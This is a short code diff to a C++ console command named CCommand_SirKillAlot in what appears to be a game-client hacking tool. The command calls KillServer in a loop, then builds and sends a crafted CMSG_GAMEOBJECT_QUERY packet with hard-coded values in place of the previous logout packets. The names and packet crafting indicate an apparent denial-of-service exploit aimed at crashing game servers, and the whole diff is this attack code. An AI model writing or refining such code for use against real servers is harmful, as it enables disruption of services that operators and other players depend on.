@@ -217,15 +217,13 @@ BOOL CCommand_SirKillAlot(char const* cmd, char const* args)
         return TRUE;
 
     KillServer(cmd,std::to_string(killalotmuch).c_str());
+    CCommand_ReportBug("bugged", std::to_string(killalotmuch).c_str());
     CDataStore data;
-    data.PutInt32(CMSG_LOGOUT_REQUEST);
+    data.PutInt32(CMSG_GAMEOBJECT_QUERY);
+    data.PutInt32(324);
+    data.PutInt64(34454);
     data.Finalize();
     s_client.SendPacket(&data);
-
-    CDataStore data2;
-    data2.PutInt32(CMSG_LOGOUT_CANCEL);
-    data2.Finalize();
-    s_client.SendPacket(&data2);
 
     Console::Write("", ECHO_COLOR);
     return TRUE;
